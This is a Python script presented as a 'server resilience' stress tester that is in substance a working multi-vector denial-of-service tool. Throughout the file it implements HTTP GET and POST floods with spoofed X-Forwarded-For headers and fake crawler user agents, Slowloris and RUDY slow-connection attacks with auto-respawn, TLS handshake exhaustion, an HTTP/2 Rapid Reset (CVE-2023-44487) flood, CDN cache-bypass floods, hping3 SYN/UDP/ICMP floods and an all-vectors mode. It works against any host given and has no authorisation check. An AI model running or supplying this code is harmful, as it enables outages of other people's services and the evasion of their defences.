#!/usr/bin/env python3
"""
XC STRESS TESTER v2.0 — Server Resilience & Load Testing Lab
Vectors: HTTP L7, Slowloris, RUDY, TLS Exhaust, L4, UDP Amplify, HTTP/2 Reset, Cache Bypass
"""

import subprocess, sys, threading, socket, ssl, time, random, argparse, os
import struct, urllib.parse
from concurrent.futures import ThreadPoolExecutor

# ── optional imports ───────────────────────────────────────────────────────
try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

ANSI = {
    "red": "\033[91m", "green": "\033[92m", "yellow": "\033[93m",
    "cyan": "\033[96m", "magenta": "\033[95m", "bold": "\033[1m", "reset": "\033[0m"
}
def c(text, color): return f"{ANSI[color]}{text}{ANSI['reset']}"

BANNER = f"""
{c('╔══════════════════════════════════════════════════════╗', 'red')}
{c('║', 'red')}  {c('XC STRESS TESTER v2.0', 'bold')}  ·  {c('SERVER RESILIENCE LAB', 'yellow')}    {c('║', 'red')}
{c('║', 'red')}  Vectors: L7·L4·Slow·RUDY·TLS·H2·Cache·Amplify      {c('║', 'red')}
{c('╚══════════════════════════════════════════════════════╝', 'red')}
"""

# ── User-Agent pool ────────────────────────────────────────────────────────
UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/113.0 Firefox/113.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
]

REFERER_POOL = [
    "https://www.google.com/search?q=",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
]

# ── stats tracker ──────────────────────────────────────────────────────────
class Stats:
    def __init__(self):
        self._lock = threading.Lock()
        self.sent = 0
        self.success = 0
        self.errors = 0
        self.start = time.time()

    def inc(self, success=True):
        with self._lock:
            self.sent += 1
            if success: self.success += 1
            else: self.errors += 1

    def report(self):
        elapsed = time.time() - self.start or 1
        rps = self.sent / elapsed
        print(c(f"\n[STATS] Sent: {self.sent} | OK: {self.success} | Err: {self.errors} | "
                f"RPS: {rps:.1f} | Elapsed: {elapsed:.1f}s", "green"))

# ── pre-flight check ───────────────────────────────────────────────────────
def preflight(host, port, timeout=5):
    print(c(f"[*] Pre-flight check {host}:{port}...", "cyan"))
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.close()
        print(c(f"[+] Target UP — starting attack", "green"))
        return True
    except Exception as e:
        print(c(f"[!] Target unreachable: {e}", "red"))
        return False

# ── random headers helper ──────────────────────────────────────────────────
def rand_headers(host, extra=None):
    h = {
        "User-Agent": random.choice(UA_POOL),
        "Host": host,
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.9", "zh-CN,zh;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Referer": random.choice(REFERER_POOL) + host,
        "X-Forwarded-For": f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}",
    }
    if extra:
        h.update(extra)
    return h

# ── HTTP FLOOD (external tool) ─────────────────────────────────────────────
def http_flood(target, duration, threads, tool="wrk"):
    print(c(f"\n[HTTP FLOOD] Tool: {tool} | Threads: {threads} | Duration: {duration}s", "cyan"))
    parsed = urllib.parse.urlparse(target)
    host = parsed.netloc

    if tool == "wrk":
        cmd = ["wrk", "-t", str(threads), "-c", str(threads * 10),
               "-d", f"{duration}s", "--latency",
               "-H", f"User-Agent: {random.choice(UA_POOL)}",
               target]
    elif tool == "hey":
        cmd = ["hey", "-z", f"{duration}s", "-c", str(threads * 10), "-q", "0", target]
    elif tool == "siege":
        cmd = ["siege", "-c", str(threads * 10), "-t", f"{duration}S", "--no-parser", target]
    elif tool == "ab":
        cmd = ["ab", "-n", "999999", "-c", str(threads * 10), "-t", str(duration), target]
    elif tool == "h2load":
        cmd = ["h2load", "-n", "999999", "-c", str(threads), "-t", str(min(threads, 8)),
               "-m", "100", "--duration", str(duration), target]
    else:
        print(c(f"[!] Tool {tool} tidak dikenali", "red"))
        return

    try:
        result = subprocess.run(cmd, timeout=duration + 15, capture_output=True, text=True)
        print(result.stdout[-3000:] if result.stdout else "")
        if result.stderr: print(c(result.stderr[-500:], "yellow"))
    except FileNotFoundError:
        print(c(f"[!] {tool} tidak terinstall.", "red"))
    except subprocess.TimeoutExpired:
        print(c("[+] Flood selesai", "green"))

# ── L7 HTTP FLOOD (pure python, no external tool) ─────────────────────────
def l7_worker(host, port, path, use_ssl, stop_event, stats, cache_bypass=False):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))

            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)

            # Cache bypass: append random param
            req_path = path
            if cache_bypass:
                req_path += f"?_={random.randint(0, 99999999)}&r={random.randint(0,9999)}"

            headers = rand_headers(host)
            request = f"GET {req_path} HTTP/1.1\r\n"
            request += "\r\n".join(f"{k}: {v}" for k, v in headers.items())
            request += "\r\n\r\n"

            s.sendall(request.encode())
            resp = s.recv(1024)
            stats.inc(success=bool(resp))
        except Exception:
            stats.inc(success=False)
        finally:
            try: s.close()
            except: pass

def l7_flood(host, port, path, duration, threads, use_ssl=False, cache_bypass=False):
    mode = "CACHE-BYPASS" if cache_bypass else "STANDARD"
    proto = "HTTPS" if use_ssl else "HTTP"
    print(c(f"\n[L7 FLOOD] {proto} {mode} → {host}:{port}{path} | "
            f"Threads: {threads} | Duration: {duration}s", "cyan"))

    stats = Stats()
    stop = threading.Event()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = [ex.submit(l7_worker, host, port, path, use_ssl, stop, stats, cache_bypass)
                   for _ in range(threads)]
        time.sleep(duration)
        stop.set()

    stats.report()

# ── POST FLOOD ─────────────────────────────────────────────────────────────
def post_worker(host, port, path, use_ssl, stop_event, stats, body_size=1024):
    payload = ("X" * body_size).encode()
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((host, port))
            if use_ssl:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=host)

            headers = rand_headers(host, {
                "Content-Type": "application/x-www-form-urlencoded",
                "Content-Length": str(body_size),
            })
            request = f"POST {path} HTTP/1.1\r\n"
            request += "\r\n".join(f"{k}: {v}" for k, v in headers.items())
            request += "\r\n\r\n"
            s.sendall(request.encode() + payload)
            resp = s.recv(256)
            stats.inc(success=bool(resp))
        except Exception:
            stats.inc(success=False)
        finally:
            try: s.close()
            except: pass

def post_flood(host, port, path, duration, threads, use_ssl=False, body_size=4096):
    print(c(f"\n[POST FLOOD] {host}:{port}{path} | Body: {body_size}B | "
            f"Threads: {threads} | Duration: {duration}s", "cyan"))
    stats = Stats()
    stop = threading.Event()
    with ThreadPoolExecutor(max_workers=threads) as ex:
        [ex.submit(post_worker, host, port, path, use_ssl, stop, stats, body_size)
         for _ in range(threads)]
        time.sleep(duration)
        stop.set()
    stats.report()

# ── SLOWLORIS ──────────────────────────────────────────────────────────────
def slowloris_worker(host, port, stop_event, stats, use_ssl=False):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((host, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        # Send partial HTTP request header
        s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n"
               f"Host: {host}\r\n"
               f"User-Agent: {random.choice(UA_POOL)}\r\n".encode())
        stats.inc(success=True)

        while not stop_event.is_set():
            # Keep connection alive by dribbling headers
            s.send(f"X-Header-{random.randint(1,999)}: {random.randint(1,9999)}\r\n".encode())
            time.sleep(random.uniform(10, 20))

    except Exception:
        stats.inc(success=False)
    finally:
        if s:
            try: s.close()
            except: pass
        # Respawn socket to maintain count
        if not stop_event.is_set():
            slowloris_worker(host, port, stop_event, stats, use_ssl)

def slowloris(host, port, num_sockets, duration, use_ssl=False):
    proto = "HTTPS" if use_ssl else "HTTP"
    print(c(f"\n[SLOWLORIS] {proto} → {host}:{port} | Sockets: {num_sockets} | "
            f"Duration: {duration}s", "cyan"))
    stats = Stats()
    stop = threading.Event()

    threads = []
    for _ in range(num_sockets):
        t = threading.Thread(target=slowloris_worker,
                             args=(host, port, stop, stats, use_ssl), daemon=True)
        t.start()
        threads.append(t)

    print(c(f"[+] {num_sockets} slow connections launched (auto-respawn on drop)", "green"))
    time.sleep(duration)
    stop.set()
    stats.report()

# ── RUDY — R-U-Dead-Yet (Slow POST body) ──────────────────────────────────
def rudy_worker(host, port, path, stop_event, stats, use_ssl=False, body_size=100000):
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(15)
        s.connect((host, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        # POST with huge Content-Length but send body 1 byte at a time
        headers = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {random.choice(UA_POOL)}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {body_size}\r\n"
            f"Connection: keep-alive\r\n\r\n"
        )
        s.send(headers.encode())
        stats.inc(success=True)

        sent = 0
        while not stop_event.is_set() and sent < body_size:
            s.send(b"X")
            sent += 1
            time.sleep(random.uniform(8, 15))  # drip 1 byte every ~10s

    except Exception:
        stats.inc(success=False)
    finally:
        if s:
            try: s.close()
            except: pass
        # Respawn
        if not stop_event.is_set():
            rudy_worker(host, port, path, stop_event, stats, use_ssl, body_size)

def rudy(host, port, path, num_sockets, duration, use_ssl=False):
    proto = "HTTPS" if use_ssl else "HTTP"
    print(c(f"\n[RUDY — Slow POST] {proto} → {host}:{port}{path} | "
            f"Sockets: {num_sockets} | Duration: {duration}s", "magenta"))
    print(c("[*] Dripping POST body at 1 byte/10s — exhausting connection pool", "yellow"))
    stats = Stats()
    stop = threading.Event()

    for _ in range(num_sockets):
        threading.Thread(target=rudy_worker,
                         args=(host, port, path, stop, stats, use_ssl),
                         daemon=True).start()

    print(c(f"[+] {num_sockets} RUDY sockets active (auto-respawn)", "green"))
    time.sleep(duration)
    stop.set()
    stats.report()

# ── TLS EXHAUSTION ─────────────────────────────────────────────────────────
def tls_worker(host, port, stop_event, stats):
    while not stop_event.is_set():
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(8)
            s.connect((host, port))
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            # Force expensive cipher for server
            ctx.set_ciphers("ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256")
            wrapped = ctx.wrap_socket(s, server_hostname=host)
            # Immediately abandon after handshake — server CPU wasted
            wrapped.close()
            stats.inc(success=True)
        except Exception:
            stats.inc(success=False)
            if s:
                try: s.close()
                except: pass

def tls_exhaust(host, port, threads, duration):
    print(c(f"\n[TLS EXHAUSTION] {host}:{port} | Threads: {threads} | "
            f"Duration: {duration}s", "magenta"))
    print(c("[*] Forcing expensive TLS handshakes — targeting server CPU", "yellow"))
    stats = Stats()
    stop = threading.Event()

    with ThreadPoolExecutor(max_workers=threads) as ex:
        [ex.submit(tls_worker, host, port, stop, stats) for _ in range(threads)]
        time.sleep(duration)
        stop.set()

    stats.report()

# ── HTTP/2 RAPID RESET (CVE-2023-44487) ───────────────────────────────────
def h2_rapid_reset(host, port, duration, streams_per_conn=100):
    if not HAS_HTTPX:
        print(c("[!] httpx not installed. Run: pip install httpx[http2]", "red"))
        return

    print(c(f"\n[HTTP/2 RAPID RESET] CVE-2023-44487 → {host}:{port} | "
            f"Streams/conn: {streams_per_conn} | Duration: {duration}s", "magenta"))
    print(c("[*] HEADERS → RST_STREAM flood — max resource exhaustion per connection", "yellow"))

    import httpx
    stats = Stats()
    stop = threading.Event()

    def h2_worker():
        url = f"https://{host}:{port}/"
        try:
            with httpx.Client(http2=True, verify=False, timeout=10) as client:
                while not stop.is_set():
                    for _ in range(streams_per_conn):
                        if stop.is_set(): break
                        try:
                            # Open stream then immediately cancel
                            with client.stream("GET", url + f"?r={random.randint(0,9999999)}",
                                               headers=rand_headers(host)) as r:
                                r.close()  # RST_STREAM
                            stats.inc(success=True)
                        except Exception:
                            stats.inc(success=False)
        except Exception:
            stats.inc(success=False)

    threads = []
    for _ in range(20):
        t = threading.Thread(target=h2_worker, daemon=True)
        t.start()
        threads.append(t)

    time.sleep(duration)
    stop.set()
    stats.report()

# ── CACHE BYPASS FLOOD ─────────────────────────────────────────────────────
def cache_bypass_flood(host, port, path, duration, threads, use_ssl=False):
    print(c(f"\n[CACHE BYPASS] {host}:{port}{path} | Threads: {threads} | "
            f"Duration: {duration}s", "cyan"))
    print(c("[*] Random params → CDN cache miss → every req hits origin", "yellow"))
    l7_flood(host, port, path, duration, threads, use_ssl, cache_bypass=True)

# ── TCP/UDP/ICMP FLOOD (hping3) ────────────────────────────────────────────
def layer4_flood(host, port, duration, proto="tcp"):
    print(c(f"\n[LAYER 4 FLOOD] {proto.upper()} → {host}:{port} | {duration}s", "cyan"))

    if proto == "tcp":
        cmd = ["hping3", "--flood", "--syn", "-p", str(port), host]
    elif proto == "udp":
        cmd = ["hping3", "--flood", "--udp", "-p", str(port), host]
    elif proto == "icmp":
        cmd = ["hping3", "--flood", "--icmp", host]
    else:
        cmd = ["nping", "--tcp", "-p", str(port), "--rate", "10000", host]

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        time.sleep(duration)
        proc.terminate()
        out, _ = proc.communicate(timeout=5)
        if out: print(out.decode()[-1000:])
        print(c("[+] Layer4 done", "green"))
    except FileNotFoundError:
        print(c("[!] hping3 tidak terinstall: apt install hping3", "red"))
    except Exception as e:
        print(c(f"[!] {e}", "red"))

# ── UDP AMPLIFICATION SIM ──────────────────────────────────────────────────
def udp_amplify(host, port, duration, size=1024):
    print(c(f"\n[UDP AMPLIFY SIM] {host}:{port} | Payload: {size}B | {duration}s", "cyan"))
    payload = random.randbytes(size)
    sent = 0
    end = time.time() + duration
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end:
            s.sendto(payload, (host, port))
            sent += 1
        print(c(f"[+] Sent {sent} pkts ({sent*size/1024:.1f} KB)", "green"))
    except Exception as e:
        print(c(f"[!] {e}", "red"))
    finally:
        if s:
            try: s.close()
            except: pass

# ── FULL STRESS ────────────────────────────────────────────────────────────
def full_stress(host, port, path, duration, threads, use_ssl=False, tool="wrk"):
    proto = "https" if use_ssl else "http"
    target_url = f"{proto}://{host}:{port}{path}"
    print(c(f"\n[FULL STRESS] All vectors → {host}:{port} | Duration: {duration}s", "red"))

    vectors = [
        threading.Thread(target=http_flood,
                         args=(target_url, duration, threads, tool)),
        threading.Thread(target=l7_flood,
                         args=(host, port, path, duration, threads//2, use_ssl, True)),
        threading.Thread(target=slowloris,
                         args=(host, port, 200, duration, use_ssl)),
        threading.Thread(target=rudy,
                         args=(host, port, path, 100, duration, use_ssl)),
        threading.Thread(target=layer4_flood,
                         args=(host, port, duration, "tcp")),
        threading.Thread(target=udp_amplify,
                         args=(host, port, duration)),
    ]
    if use_ssl:
        vectors.append(threading.Thread(target=tls_exhaust,
                                        args=(host, port, threads//2, duration)))

    for v in vectors: v.start()
    for v in vectors: v.join()
    print(c("\n[+] FULL STRESS selesai — cek server metrics lo", "green"))

# ── MAIN ───────────────────────────────────────────────────────────────────
def main():
    print(BANNER)
    p = argparse.ArgumentParser(description="XC Stress Tester v2.0",
                                formatter_class=argparse.RawTextHelpFormatter)
    p.add_argument("mode", choices=[
        "http",       # External tool flood (wrk/hey/siege/ab/h2load)
        "l7",         # Pure Python L7 GET flood
        "post",       # POST body flood
        "slowloris",  # Slow header attack
        "rudy",       # Slow POST body attack
        "tls",        # TLS handshake exhaustion
        "h2reset",    # HTTP/2 Rapid Reset CVE-2023-44487
        "cache",      # Cache bypass flood
        "layer4",     # TCP/UDP/ICMP flood
        "amplify",    # UDP amplification sim
        "full",       # All vectors simultaneously
    ])
    p.add_argument("host",     help="Target host/IP")
    p.add_argument("-p", "--port",     type=int, default=80)
    p.add_argument("-P", "--path",     default="/",       help="URL path (default: /)")
    p.add_argument("-d", "--duration", type=int, default=30)
    p.add_argument("-t", "--threads",  type=int, default=50)
    p.add_argument("-s", "--ssl",      action="store_true", help="Use HTTPS/TLS")
    p.add_argument("--tool",   default="wrk",  choices=["wrk","hey","siege","ab","h2load"])
    p.add_argument("--proto",  default="tcp",  choices=["tcp","udp","icmp"])
    p.add_argument("--sockets",type=int, default=500)
    p.add_argument("--size",   type=int, default=1024,  help="UDP payload bytes")
    p.add_argument("--body",   type=int, default=4096,  help="POST body bytes")
    p.add_argument("--streams",type=int, default=100,   help="H2 streams per conn")
    args = p.parse_args()

    # Auto-detect SSL from port
    if args.port == 443 and not args.ssl:
        args.ssl = True

    print(c(f"[TARGET] {args.host}:{args.port}{args.path} | "
            f"Mode: {args.mode} | Duration: {args.duration}s | "
            f"SSL: {args.ssl}", "yellow"))

    if not preflight(args.host, args.port):
        sys.exit(1)

    m = args.mode
    if m == "http":
        proto = "https" if args.ssl else "http"
        http_flood(f"{proto}://{args.host}:{args.port}{args.path}",
                   args.duration, args.threads, args.tool)

    elif m == "l7":
        l7_flood(args.host, args.port, args.path, args.duration,
                 args.threads, args.ssl)

    elif m == "post":
        post_flood(args.host, args.port, args.path, args.duration,
                   args.threads, args.ssl, args.body)

    elif m == "slowloris":
        slowloris(args.host, args.port, args.sockets, args.duration, args.ssl)

    elif m == "rudy":
        rudy(args.host, args.port, args.path, args.sockets, args.duration, args.ssl)

    elif m == "tls":
        tls_exhaust(args.host, args.port, args.threads, args.duration)

    elif m == "h2reset":
        h2_rapid_reset(args.host, args.port, args.duration, args.streams)

    elif m == "cache":
        cache_bypass_flood(args.host, args.port, args.path,
                           args.duration, args.threads, args.ssl)

    elif m == "layer4":
        layer4_flood(args.host, args.port, args.duration, args.proto)

    elif m == "amplify":
        udp_amplify(args.host, args.port, args.duration, args.size)

    elif m == "full":
        full_stress(args.host, args.port, args.path, args.duration,
                    args.threads, args.ssl, args.tool)

if __name__ == "__main__":
    main()
